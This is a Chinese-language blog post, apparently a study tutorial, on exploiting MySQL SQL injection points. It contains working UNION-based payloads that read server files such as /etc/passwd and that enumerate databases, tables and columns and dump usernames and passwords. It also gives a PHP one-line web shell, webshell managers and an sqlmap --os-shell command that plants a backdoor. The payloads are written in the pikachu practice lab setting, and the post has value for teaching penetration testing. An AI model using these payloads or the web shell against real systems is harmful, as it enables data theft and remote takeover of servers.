---
layout: post
title: SQL注入点利用
date: 2026-02-24
tags: [SQL注入点的利用]
---

# SQL注入点利用

> 找到SQL注入点只是第一步，如何利用它才是关键。本文系统讲解从读取文件、提取数据库数据到GetShell的完整利用链路，涵盖Union注入、文件读写、木马上传与sqlmap自动化利用等核心手法。

---

## 一、读取文件数据

通过SQL注入的 `LOAD_FILE()` 函数可以直接读取服务器上的文件内容。

### 前提条件

1. 通过信息收集获取到目标文件的**真实物理路径**（如 `/etc/passwd`、`/etc/shadow`）
2. MySQL 已开启 `secure_file_priv` 配置，允许通过SQL语句读取文件

### 基本语法

```sql
SELECT LOAD_FILE('C:\\1.txt');
```

### Union 注入中读取文件

```sql
' UNION SELECT 1, LOAD_FILE('C:\\1.txt')#
```

> **💡 提示：** Union 联合查询要求前后列数一致，如果前后查询列数不匹配，在 `LOAD_FILE` 前面补充 `1, 2, 3...` 来凑齐列数。

---

## 二、读取数据库数据

利用 Union 联合查询，逐步提取数据库中的所有信息。

### 2.1 判断列数 — ORDER BY 法

```sql
SELECT email, id FROM member ORDER BY 1, 2;
```

`ORDER BY 1, 2` 表示按列的顺序排序。如果后面的数字小于实际列数则正常，**超过则报错**，利用这个特性判断列数。

**Payload：**

```sql
' ORDER BY 1,2,3#
```

- **报错** → 列数不足 3，继续增加
- **正常显示**（如"username不存在"）→ 列数匹配，判断成功

![判断列数](/assets/images/06/image.png)

---

### 2.2 获取基本信息

构造 Union Select 语句，查询当前用户、数据库、版本等信息：

```sql
' UNION SELECT user(), version()#
```

> **⚠️ 注意：** 前后查询列数必须相等。

常用查询函数：

| 函数 | 作用 |
|------|------|
| `user()` | 当前数据库用户 |
| `database()` | 当前数据库名 |
| `version()` | 数据库版本 |
| `@@version_compile_os` | 服务器操作系统 |

---

### 2.3 获取所有数据库名

`information_schema` 库中存储了所有数据库的元数据信息。

```sql
' UNION SELECT 1, GROUP_CONCAT(schema_name) FROM information_schema.schemata--+

-- 或使用 # 闭合
' UNION SELECT 1, GROUP_CONCAT(schema_name) FROM information_schema.schemata#
```

![获取所有库名](/assets/images/06/image-1.png)

> **💡 为什么要用 `GROUP_CONCAT`？**
>
> `GROUP_CONCAT` 将多行结果合并成一行字符串。Union 注入时前端页面通常只接收和渲染第一条数据，只能显示一行。合并为一行后，就能通过 Union 一次性全部显示在页面上。

---

### 2.4 获取指定库的所有表名

以 `pikachu` 库为例：

```sql
' UNION SELECT 1, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--+

-- 或
' UNION SELECT 1, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()#
```

![获取表名](/assets/images/06/image-2.png)

---

### 2.5 获取表中的字段名

以 `users` 表为例：

```sql
' UNION SELECT 1, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=0x7573657273--+
```

> **💡 为什么表名用十六进制？**
>
> `0x7573657273` 就是 `users` 的十六进制表示。提交数据时浏览器会自动进行 URL 编码，使用十六进制可以避免编码过程中出问题。使用十六进制后不需要外层的单双引号。
>
> **转换工具：** 小葵工具、Burp Suite 的 Decoder 模块等。

---

### 2.6 获取字段数据

获取 `users` 表中所有数据，用 `0x7c`（`|`）作为字段分隔符：

```sql
' UNION SELECT 1, GROUP_CONCAT(id, 0x7c, username, 0x7c, password, 0x7c, level) FROM users--+
```

![获取字段数据](/assets/images/06/image-3.png)

---

## 三、GetShell

### 3.1 什么是木马

木马是一段程序，运行到目标主机上后可以进行**远程控制、信息盗取**等功能。一般不会破坏目标主机（除非攻击者刻意为之）。

### 3.2 常用一句话木马管理工具

| 工具 | 说明 |
|------|------|
| 中国菜刀 | 经典老牌工具 |
| 蚁剑 | 目前最流行的WebShell管理工具 |
| 冰蝎 | 加密流量，绕过WAF |
| 哥斯拉 | 新一代加密流量管理工具 |

### 3.3 蚁剑实战演示

通过目标URL和连接密码，即可连接到上传的一句话木马程序，从而控制目标主机。

**一句话木马：**

```php
<?php @eval($_POST['jaden']); ?>
```

**原理：** 蚁剑工具向木马文件发送 POST 请求，携带指令数据。数据格式为 `jaden:系统指令`，例如 `jaden:dir`。木马中 `$_POST['jaden']` 取出 `dir`，`eval()` 将其作为系统指令执行，再将执行结果返回给蚁剑显示。

![蚁剑连接](/assets/images/06/image-5.png)

![蚁剑配置](/assets/images/06/image-4.png)

![蚁剑文件管理](/assets/images/06/image-6.png)

![蚁剑终端](/assets/images/06/image-7.png) 点击终端即可 GetShell

---

### 3.4 通过注入点写入木马的前提条件

1. **MySQL 配置：** `secure_file_priv=""`（允许文件读写）

![secure_file_priv配置](/assets/images/06/image-8.png)

2. **已知网站代码的真实物理路径**
3. **物理路径具备写入权限**
4. **最好是 MySQL 的 root 用户**（非必须，但有最好）

---

## 四、获得后台真实物理路径的方法

| 方法 | 说明 |
|------|------|
| **探针文件** | 检测 `phpinfo.php` 等探针文件是否可访问，直接访问 `192.168.x.x/phpinfo.php` |
| **报错信息** | 访问不存在的路径或提交非法参数，让网站报错，从错误信息中提取路径 |
| **指纹信息** | Nginx 默认站点目录 `/usr/share/nginx/html`，配置文件 `/etc/nginx/nginx.conf`；Apache 默认 `/var/www/html` |
| **其他漏洞** | 通过远程命令执行等漏洞执行 `phpinfo()` 函数，查看详细信息 |
| **其他思路** | 不断尝试，综合利用各种手段 |

---

## 五、sqlmap 的 GetShell

前提条件与手动写入相同（`secure_file_priv=""`、已知物理路径等）。

```bash
sqlmap -r 1.txt --os-shell
```

![sqlmap os-shell](/assets/images/06/image-9.png)

![sqlmap上传文件](/assets/images/06/image-10.png)

![sqlmap选择平台](/assets/images/06/image-11.png)

sqlmap 会自动上传两个文件：

- **上传功能文件**（临时文件上传组件）
- **木马文件**（持久化后门）

![sqlmap上传的文件](/assets/images/06/image-12.png)

> **⚠️ 输入 `exit` 后，sqlmap 会自动删除这两个文件。**
